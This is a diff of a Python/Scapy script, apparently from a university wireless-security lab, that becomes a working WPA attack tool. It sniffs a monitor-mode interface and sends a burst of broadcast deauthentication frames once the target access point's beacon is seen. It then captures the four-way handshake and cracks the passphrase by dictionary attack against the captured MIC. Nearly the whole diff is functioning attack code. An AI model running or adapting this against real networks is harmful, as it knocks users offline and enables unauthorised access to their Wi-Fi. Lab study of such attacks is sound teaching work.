@@ -2,37 +2,23 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
-
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Dictionary attack on passphrase derived from the 4-way handshake info, 
+uses an interface in monitor mode to sniff packets
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
+__author__      = "Diego Villagrasa, Fabio Marques"
+__copyright__   = "Copyright 2021, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__email__ 		= "diego.villagrasa@heig-vd.ch"
 __status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex, hexlify
-#from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
-
-class Target:
-  def __init__(self, ap_mac, client_mac):
-    self.ap_mac = ap_mac
-    self.client_mac = client_mac
-    self.ssid = None
-    self.a_nonce = None
-    self.s_nonce = None
-    self.mic = None
-    self.data = None
 
 def customPRF512(key,A,B):
     """
@@ -46,8 +32,6 @@ def customPRF512(key,A,B):
         i+=1
         R = R+hmacsha1.digest()
     return R[:blen]
-
-targets = dict()
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
@@ -72,13 +56,15 @@ mic_to_test = ""
 
 data = ""
 
-emptyNONCE = b"0000000000000000000000000000000000000000000000000000000000000000"
-emptyMIC = b"00000000000000000000000000000000"
+# keep track of which message we have received
+msg = 0b000
 
-msg = 0b0000
+# Should continue sniffing
 snf= True
 
-
+"""
+    This function cracks the passphrase using a dictionary attack
+"""
 def crack():
     global ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, data, sniff, A
     print ("\n\nValues used to derivate keys")
@@ -91,7 +77,8 @@ def crack():
     print ("Mic: ",mic_to_test,"\n")
 
     B = min(a2b_hex(APmac),a2b_hex(Clientmac))+max(a2b_hex(APmac),a2b_hex(Clientmac))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))
-
+    
+    # Load the wordlist and iterate over it
     with open("wordlist.txt") as f:
         while(True):
             passPhrase  = f.readline().replace("\n", "")
@@ -123,63 +110,92 @@ def crack():
             print ("MIC:\t\t",mic.digest()[:-4],"\n")
             print ("ORIG MIC:\t",mic_to_test,"\n")
 
+            # Check if the calculated mic is the same as the mic
             if mic_to_test == mic.digest()[:-4]:
                 print("Found Passphrase: ", passPhrase.decode())
                 exit(0)
 
     print("Could not find passphrase")
 
+"""
+    This function extracts information from the 4-way handshake to help crack the passphrase
+"""
 def process(pkt):
     global ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, data, snf, msg
     if not snf:
         return
+
+    # Empty values to compare to
     emptyNONCE = b"0000000000000000000000000000000000000000000000000000000000000000"
     emptyMIC = b"00000000000000000000000000000000"
     
-    #print(pkt.show())
+    # Check if we have a 802.11 packet and haven't found the WiFi mac yet
     if pkt.haslayer(Dot11Beacon) and APmac == "":
-        print("BEACON")
         try:
-            print(pkt[Dot11Beacon].info.decode('ascii'))
+
+            # Check if the packet contains the right ssid 
             if pkt.info.decode('ascii') == ssid:
+
+                #Register the mac of the ap
                 APmac = pkt[Dot11].addr2.replace(":", "")
                 print("Found SSID MAC", APmac)
+                
+                # Sends deauth packets once we have the mac
+                print("Deauth")
                 deauth = RadioTap() / Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2="A0:B5:49:0E:55:F9", addr3="A0:B5:49:0E:55:F9") / Dot11Deauth(reason=7)
                 sendp(deauth, inter=0.1, count=50, iface="wlan0mon")
-                print("DAUTH")
+                
         except Exception:
             pass
-        
+    
+    # Check foe EAPOL packet
     if pkt.haslayer(EAPOL):
         src = pkt[Dot11].addr2.replace(":", "")
         dst = pkt[Dot11].addr1.replace(":", "")
         to_DS = pkt[Dot11].FCfield & 0x1 !=0
         from_DS = pkt[Dot11].FCfield & 0x2 !=0
+
+        # If the packet id from DS
         if from_DS == True and src == APmac:
             nonce = hexlify(pkt[Raw].load)[26:90]
             mic = hexlify(pkt[Raw].load)[154:186]
+
+            # If we have a nonce and an empty mac we have the first message
             if nonce != emptyNONCE and mic == emptyMIC:
                 APmac = src; Clientmac = dst
                 print("M1")
                 ANonce = nonce
                 msg |= 0b001
+            
+            # Else if the client and ap are the right ones and we have a mic and a nonce it's the message 3
             elif src == APmac and dst == Clientmac and nonce != emptyNONCE and mic != emptyMIC:
                 print("M3")
+
+        # Else if it's to DS
         elif to_DS == True and dst == APmac:
             nonce = hexlify(pkt[Raw].load)[26:90]
             mic = hexlify(pkt[Raw].load)[154:186]
+
+            # If the client and ap are the right and we have a nonce and a mic we have the second message
             if src == Clientmac and dst == APmac and nonce != emptyNONCE and mic != emptyMIC:
                 print("M2")
                 SNonce = nonce
                 msg |= 0b010
+
+            # Else if the client and ap are the right and we have no nonce and a mic we have the 4th message
             elif src == Clientmac and dst == APmac and nonce == emptyNONCE and mic != emptyMIC:
                 print("M4")
                 mic_to_test = a2b_hex(mic)
                 data = raw(pkt[EAPOL]).replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
                 msg |= 0b100
 
+    ### This part is a fix for parsing packets in Windows ###
+    # This is the same process as the code above
+
+    # Check for association request
     elif pkt.haslayer(Dot11AssoReq):
-        dst = ''.join('%02x' % b for b in raw(pkt)[18:24]) # the mac is broken here for some reason so we have to get it manualy
+        # the mac is broken here for some reason so we have to get it manualy
+        dst = ''.join('%02x' % b for b in raw(pkt)[18:24])
         src = ''.join('%02x' % b for b in raw(pkt)[24:30])
         to_DS = raw(pkt)[15] & 0x1 !=0
         if to_DS == True and dst == APmac:
@@ -193,8 +209,11 @@ def process(pkt):
                 mic_to_test = a2b_hex(mic)
                 data = pkt.payload.payload.payload.payload.info[1:].replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
 
+    # Check if we have all the messages we need
     if msg & 0b111 == 0b111:
         print("SNIFF Complete")
         snf = False
         crack()
+
+# Start sniffing on interface wlan0mon
 sniff(iface="wlan0mon", prn=process)
